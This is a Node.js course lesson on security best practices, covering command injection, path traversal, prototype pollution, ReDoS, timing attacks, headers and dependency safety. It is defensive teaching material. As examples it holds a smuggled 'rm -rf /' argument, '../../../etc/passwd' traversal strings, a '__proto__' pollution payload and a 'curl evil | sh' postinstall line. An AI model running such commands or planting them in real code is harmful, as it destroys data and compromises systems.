# Module 10 / Lesson 09 — Security Best Practices

> Security is not a feature you bolt on at the end — it is a property of the entire system. A single overlooked `exec()` call, an unvalidated file path, or a leaked stack trace can undo months of careful engineering. This lesson consolidates the defensive patterns every Node.js developer must internalize before shipping to production.

## Learning Objectives

- Identify and prevent the most common injection attacks in Node.js: command injection, path traversal, and prototype pollution
- Apply constant-time comparison with `crypto.timingSafeEqual()` to defeat timing attacks
- Detect and prevent Regular Expression Denial of Service (ReDoS) from catastrophic backtracking
- Implement proper error handling that never leaks internal details to clients
- Apply a 10-point security audit checklist to any Node.js application

---

## Security Is Not a Feature

Every layer of a Node.js application has a security surface:

```
┌────────────────────┬──────────────────────────────────────┐
│  Layer             │  Concerns                            │
├────────────────────┼──────────────────────────────────────┤
│  Network           │  TLS config, open ports, HTTPS       │
│  HTTP              │  Headers, CORS, body parsing         │
│  Application       │  Input validation, auth, access ctrl │
│  OS / Process      │  File access, env vars, child procs  │
│  Dependencies      │  Supply chain, known vulnerabilities │
└────────────────────┴──────────────────────────────────────┘
```

Security failures are almost never about missing encryption. They are about the mundane: trusting user input, running with too many privileges, or ignoring error paths.

## Input Validation — Never Trust User Input

Every value that enters your process from the outside world — HTTP bodies, query strings, headers, file uploads — is untrusted input.

```js
'use strict';

const http = require('node:http');

function handleRequest(req, res) {
  const chunks = [];
  let totalBytes = 0;
  const MAX_BODY = 1024 * 100; // 100 KB limit

  req.on('data', (chunk) => {
    totalBytes += chunk.length;
    if (totalBytes > MAX_BODY) {
      res.writeHead(413);
      res.end('Payload too large');
      req.destroy();
      return;
    }
    chunks.push(chunk);
  });

  req.on('end', () => {
    let data;
    try {
      data = JSON.parse(Buffer.concat(chunks).toString());
    } catch {
      res.writeHead(400, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ error: 'Invalid JSON' }));
      return;
    }

    // Validate type and length
    if (typeof data.name !== 'string' || data.name.length === 0 || data.name.length > 200) {
      res.writeHead(400, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ error: 'name must be a string of 1-200 characters' }));
      return;
    }

    // Sanitize for output context (prevent XSS if rendered in HTML)
    const safeName = data.name
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;');

    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end(`Hello, ${safeName}`);
  });
}
```

| Check | What to Validate | Example |
|---|---|---|
| **Type** | `typeof value === 'string'` | Reject objects where strings are expected |
| **Length** | `value.length <= MAX` | Prevent memory exhaustion |
| **Range** | `value >= 0 && value <= 100` | Reject impossible quantities |
| **Format** | Regex or parser | Email, UUID, date patterns |
| **Allowlist** | `ALLOWED.has(value)` | Reject unknown enum values |

## Command Injection

Command injection happens when user input reaches a shell interpreter. `child_process.exec()` spawns a shell, making it the most dangerous child process API.

```js
'use strict';

const { exec, execFile, spawn } = require('node:child_process');

const userInput = 'report.pdf; rm -rf /'; // Malicious input

// BAD: exec() passes the entire string to /bin/sh
// This executes: ls -la report.pdf; rm -rf /
exec(`ls -la ${userInput}`, (err, stdout) => {
  console.log(stdout);
});

// GOOD: execFile() does NOT spawn a shell — arguments are an array
execFile('ls', ['-la', userInput], (err, stdout, stderr) => {
  if (err) {
    console.error('Command failed:', err.message);
    return;
  }
  console.log(stdout);
});

// GOOD: spawn() with explicit argument array
const child = spawn('ls', ['-la', userInput]);
child.stdout.on('data', (data) => console.log(data.toString()));
child.stderr.on('data', (data) => console.error(data.toString()));
child.on('close', (code) => console.log('Exit code:', code));
```

| API | Shell? | Safe with user input? |
|---|---|---|
| `exec(cmd)` | Yes | **No** — never pass user input |
| `execFile(file, args)` | No | Yes — arguments are not shell-interpreted |
| `spawn(cmd, args)` | No (default) | Yes — use the argument array |
| `spawn(cmd, { shell: true })` | Yes | **No** — same risk as `exec` |
| `fork(modulePath)` | No | N/A — runs a Node.js module |

## Path Traversal

Path traversal attacks manipulate file paths to escape the intended directory. The classic attack string is `../../../etc/passwd`.

```js
'use strict';

const path = require('node:path');
const fs = require('node:fs');

const STATIC_ROOT = path.resolve(__dirname, 'public');

// BAD: directly joining user input to the root
function serveFileBad(userPath) {
  const filePath = path.join(STATIC_ROOT, userPath);
  return fs.readFileSync(filePath); // Escapes STATIC_ROOT with ../
}

// GOOD: resolve and verify the result stays within the root
function serveFileGood(userPath) {
  const resolved = path.resolve(STATIC_ROOT, userPath);

  if (!resolved.startsWith(STATIC_ROOT + path.sep) && resolved !== STATIC_ROOT) {
    throw new Error(`Path traversal attempt: ${userPath}`);
  }

  if (!fs.existsSync(resolved)) {
    throw new Error(`File not found: ${userPath}`);
  }

  return fs.readFileSync(resolved);
}

// Test cases
try { serveFileGood('images/logo.png');          console.log('Normal: allowed');
} catch (e) { console.log(e.message); }

try { serveFileGood('../../../etc/passwd');       // BLOCKED
} catch (e) { console.log('Traversal: blocked —', e.message); }

try { serveFileGood('images/../../secret.txt');   // BLOCKED
} catch (e) { console.log('Nested: blocked —', e.message); }
```

| Attack | What It Tries | Defense |
|---|---|---|
| `../../../etc/passwd` | Classic traversal | `path.resolve()` + prefix check |
| `..%2F..%2Fetc%2Fpasswd` | URL-encoded slashes | Decode before resolving |
| `....//....//etc/passwd` | Double-dot variations | `path.resolve()` normalizes these |
| Null bytes: `file%00.js` | Truncate at null byte | Node.js rejects null bytes since v8.x |

## Prototype Pollution

JavaScript objects inherit from `Object.prototype`. If an attacker can set properties on `Object.prototype`, every object in the process is affected.

```js
'use strict';

// HOW IT WORKS — unsafe recursive merge with user-controlled keys
function unsafeMerge(target, source) {
  for (const key in source) {
    if (typeof source[key] === 'object' && source[key] !== null) {
      target[key] = target[key] || {};
      unsafeMerge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

// Attacker sends: { "__proto__": { "isAdmin": true } }
const malicious = JSON.parse('{"__proto__": {"isAdmin": true}}');
unsafeMerge({}, malicious);

const user = {};
console.log('user.isAdmin:', user.isAdmin); // true — POLLUTED

// --- DEFENSES ---

// 1. Use Object.create(null) — no prototype chain
const safeMap = Object.create(null);

// 2. Filter dangerous keys during merge
function safeMerge(target, source) {
  const BLOCKED = new Set(['__proto__', 'constructor', 'prototype']);
  for (const key of Object.keys(source)) {
    if (BLOCKED.has(key)) continue;
    if (typeof source[key] === 'object' && source[key] !== null && !Array.isArray(source[key])) {
      target[key] = target[key] || Object.create(null);
      safeMerge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

// 3. Use Map for dynamic key-value storage
const registry = new Map();
registry.set('__proto__', 'harmless string'); // Just a string key

// 4. Freeze the prototype in security-critical code
Object.freeze(Object.prototype);
```

## Regular Expression Denial of Service (ReDoS)

Some regular expressions take exponential time on certain inputs due to *catastrophic backtracking*.

```js
'use strict';

// BAD: Nested quantifier (a+)+ causes exponential backtracking
const badRegex = /^(a+)+$/;
// 'a'.repeat(25) + 'b' would take minutes or hours

// GOOD: Rewrite without nested quantifiers
const goodRegex = /^a+$/;

// RED FLAGS — patterns that risk catastrophic backtracking:
//   1. Nested quantifiers:            (a+)+   (a*)*   (a+)*
//   2. Overlapping alternatives:      (a|a)+
//   3. Quantified overlapping groups: (.*a){10}

// DEFENSE: Limit input length before testing
function safeRegexTest(pattern, input) {
  if (input.length > 1000) {
    throw new Error(`Input too long for regex: ${input.length} chars`);
  }
  return pattern.test(input);
}

// Safe rewrites
const emailSafe = /^[a-zA-Z0-9]+(?:\.[a-zA-Z0-9]+)*@[a-zA-Z0-9-]+\.[a-zA-Z]{2,}$/;
console.log('Email test:', emailSafe.test('user@example.com')); // true
```

## Timing Attacks and `crypto.timingSafeEqual()`

String comparison with `===` returns `false` at the first mismatched character. An attacker can measure response times to guess secrets character by character.

```js
'use strict';

const crypto = require('node:crypto');

const STORED_TOKEN = 'a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6';

// BAD: Early-exit comparison leaks timing information
function verifyTokenBad(provided) {
  return provided === STORED_TOKEN;
}

// GOOD: Constant-time comparison
function verifyTokenGood(provided) {
  if (typeof provided !== 'string') return false;

  const a = Buffer.from(provided);
  const b = Buffer.from(STORED_TOKEN);

  // If lengths differ, compare b with itself to burn the same CPU time
  if (a.length !== b.length) {
    crypto.timingSafeEqual(b, b);
    return false;
  }

  return crypto.timingSafeEqual(a, b);
}

// EVEN BETTER: HMAC-based verification — digests are always the same length
function verifyTokenHMAC(provided, secret) {
  const expected  = crypto.createHmac('sha256', secret).update(STORED_TOKEN).digest();
  const candidate = crypto.createHmac('sha256', secret).update(provided).digest();
  return crypto.timingSafeEqual(expected, candidate);
}

console.log('Good verify (correct):', verifyTokenGood(STORED_TOKEN));
console.log('Good verify (wrong):',   verifyTokenGood('wrong-token'));
console.log('HMAC verify:',           verifyTokenHMAC(STORED_TOKEN, 'secret'));
```

## HTTP-Specific Hardening

### Server Timeouts and Limits

```js
'use strict';

const http = require('node:http');

const server = http.createServer((req, res) => {
  res.writeHead(200, { 'Content-Type': 'text/plain' });
  res.end('OK');
});

server.maxHeadersCount  = 50;     // Default: 2000
server.headersTimeout   = 20000;  // 20s for headers (default: 60000)
server.requestTimeout   = 30000;  // 30s total (default: 300000)
server.keepAliveTimeout = 5000;   // 5s idle (default: 5000)
server.maxConnections   = 1000;   // Prevent fd exhaustion

server.listen(3000);
```

### Security Headers

```js
'use strict';

const http = require('node:http');

function setSecurityHeaders(res) {
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Frame-Options', 'DENY');
  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
  res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
  res.setHeader('Content-Security-Policy', [
    "default-src 'self'",
    "script-src 'self'",
    "style-src 'self' 'unsafe-inline'",
    "img-src 'self' data:",
    "frame-ancestors 'none'",
  ].join('; '));
  res.setHeader('Cross-Origin-Opener-Policy', 'same-origin');
  res.setHeader('Cross-Origin-Resource-Policy', 'same-origin');
  res.setHeader('Cache-Control', 'no-store');
}

const server = http.createServer((req, res) => {
  setSecurityHeaders(res);
  res.writeHead(200, { 'Content-Type': 'text/plain' });
  res.end('Secure response');
});

server.listen(3000);
```

| Header | Purpose | Value |
|---|---|---|
| `X-Content-Type-Options` | Prevent MIME sniffing | `nosniff` |
| `X-Frame-Options` | Prevent clickjacking | `DENY` or `SAMEORIGIN` |
| `Strict-Transport-Security` | Force HTTPS | `max-age=31536000; includeSubDomains` |
| `Content-Security-Policy` | Restrict resource loading | App-specific directives |
| `Referrer-Policy` | Control referrer leakage | `strict-origin-when-cross-origin` |

## Environment Variables and Secrets

```js
'use strict';

// RULE 1: Never hardcode secrets — read from environment
const API_KEY = process.env.API_KEY;
if (!API_KEY) {
  console.error('FATAL: API_KEY environment variable is required');
  process.exit(1);
}

// RULE 2: Never log secrets
function logRequest(req) {
  // BAD: console.log('Headers:', req.headers); — may contain auth tokens
  const safe = { 'content-type': req.headers['content-type'], 'user-agent': req.headers['user-agent'] };
  console.log('Request:', req.method, req.url, safe);
}

// RULE 3: Never include secrets in error messages
function connectToDatabase(connStr) {
  try {
    throw new Error('Connection refused');
  } catch (err) {
    // BAD: throw new Error(`Failed: ${connStr}`);
    console.error('DB connection failed:', err.message);
    throw new Error('Database connection failed');
  }
}

// RULE 4: Validate all required env vars at startup
function validateEnvironment() {
  const required = ['API_KEY', 'DATABASE_URL', 'SESSION_SECRET'];
  const missing = required.filter((key) => !process.env[key]);
  if (missing.length > 0) {
    console.error('Missing env vars:', missing.join(', '));
    process.exit(1);
  }
}
```

## Error Handling — Never Expose Internals

```js
'use strict';

const http = require('node:http');
const crypto = require('node:crypto');

function handleRequest(req, res) {
  try {
    throw new Error('DB query failed: connection to 10.0.1.5:5432 refused');
  } catch (err) {
    // Log full details server-side
    console.error({
      timestamp: new Date().toISOString(),
      method: req.method,
      url: req.url,
      error: err.message,
      stack: err.stack,
    });

    // Send generic error to client — no IPs, no paths, no stack traces
    res.writeHead(500, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({
      error: 'Internal server error',
      requestId: crypto.randomUUID(),
    }));
  }
}

// Graceful handling of uncaught errors
process.on('uncaughtException', (err, origin) => {
  console.error('UNCAUGHT EXCEPTION:', err.message, origin);
  process.exit(1); // Process state is undefined — restart via process manager
});

process.on('unhandledRejection', (reason) => {
  console.error('UNHANDLED REJECTION:', reason instanceof Error ? reason.message : reason);
});

process.on('SIGTERM', () => {
  console.log('SIGTERM received — shutting down gracefully');
  process.exit(0);
});
```

## Dependency Security

Your application is only as secure as its weakest dependency.

```bash
# 1. Audit known vulnerabilities
npm audit
npm audit --production

# 2. Fix automatically
npm audit fix

# 3. Lock your dependency tree — always use npm ci in CI/CD
npm ci

# 4. Never delete package-lock.json — commit it to version control
```

| Attack Vector | Example | Defense |
|---|---|---|
| **Typosquatting** | `lodash` vs `1odash` | Double-check package names |
| **Maintainer compromise** | Attacker gains publish rights | Pin versions, audit regularly |
| **Malicious postinstall** | `"postinstall": "curl evil \| sh"` | `npm install --ignore-scripts` for audit |
| **Dependency confusion** | Public pkg shadows private name | Use scoped packages (`@company/pkg`) |
| **Abandoned packages** | No updates, known vulns | Monitor with `npm outdated` |

## The Principle of Least Privilege

```js
'use strict';

const http = require('node:http');
const { spawn } = require('node:child_process');

// 1. Never run as root — use a reverse proxy for ports 80/443
if (process.getuid && process.getuid() === 0) {
  console.error('WARNING: Running as root is dangerous');
}

// 2. Drop privileges after binding to a port (Linux)
const server = http.createServer((req, res) => {
  res.writeHead(200);
  res.end('OK');
});

server.listen(3000, () => {
  if (process.setuid && process.getuid() === 0) {
    try {
      process.setgid('nogroup');
      process.setuid('nobody');
      console.log('Dropped privileges to nobody:nogroup');
    } catch (err) {
      console.error('Failed to drop privileges:', err.message);
      process.exit(1);
    }
  }
});

// 3. Limit child process environment — pass only what it needs
const child = spawn('node', ['worker.js'], {
  env: {
    NODE_ENV: process.env.NODE_ENV,
    WORKER_ID: '1',
    // Do NOT pass DATABASE_URL, API_KEY, etc.
  },
  cwd: __dirname,
});
```

## 10-Point Node.js Security Audit Checklist

Use this checklist before every production deployment:

```
┌────┬──────────────────────────────────────────────────────────┐
│  # │ Check                                                    │
├────┼──────────────────────────────────────────────────────────┤
│  1 │ All user input validated: type, length, format, allowlist│
├────┼──────────────────────────────────────────────────────────┤
│  2 │ No exec() with user input — using execFile/spawn arrays  │
├────┼──────────────────────────────────────────────────────────┤
│  3 │ File paths resolved + checked against allowed root dir   │
├────┼──────────────────────────────────────────────────────────┤
│  4 │ Secrets from env vars only — never in code, never logged │
├────┼──────────────────────────────────────────────────────────┤
│  5 │ Error responses are generic — no stack traces to clients │
├────┼──────────────────────────────────────────────────────────┤
│  6 │ npm audit clean — package-lock committed — npm ci in CI  │
├────┼──────────────────────────────────────────────────────────┤
│  7 │ Security headers set: CSP, HSTS, X-Content-Type-Options  │
├────┼──────────────────────────────────────────────────────────┤
│  8 │ HTTPS enforced — NODE_TLS_REJECT_UNAUTHORIZED never '0'  │
├────┼──────────────────────────────────────────────────────────┤
│  9 │ Process runs as non-root with minimal permissions        │
├────┼──────────────────────────────────────────────────────────┤
│ 10 │ Body size limits, timeouts, rate limiting configured     │
│    │ Regex patterns reviewed for catastrophic backtracking    │
└────┴──────────────────────────────────────────────────────────┘
```

## Key Takeaways

- Never pass user input to `child_process.exec()` — use `execFile()` or `spawn()` with argument arrays to prevent command injection
- Always resolve file paths with `path.resolve()` and verify the result stays within the allowed root directory to prevent path traversal
- Use `crypto.timingSafeEqual()` for comparing secrets, tokens, and hashes — string `===` leaks timing information that attackers can exploit
- Never expose stack traces, internal IPs, or file paths in error responses to clients — log detailed errors server-side, send generic messages externally
- Security is a process, not a checkbox — run `npm audit` regularly, set security headers, enforce HTTPS, limit request sizes, and apply the principle of least privilege at every layer

## Next

This concludes Module 10 and the core curriculum. Continue to the [Capstone Projects](../project-01-production-http-server/README.md) or [Specialized Tracks](../track-01-performance/README.md) to apply everything you have learned in production-grade scenarios.
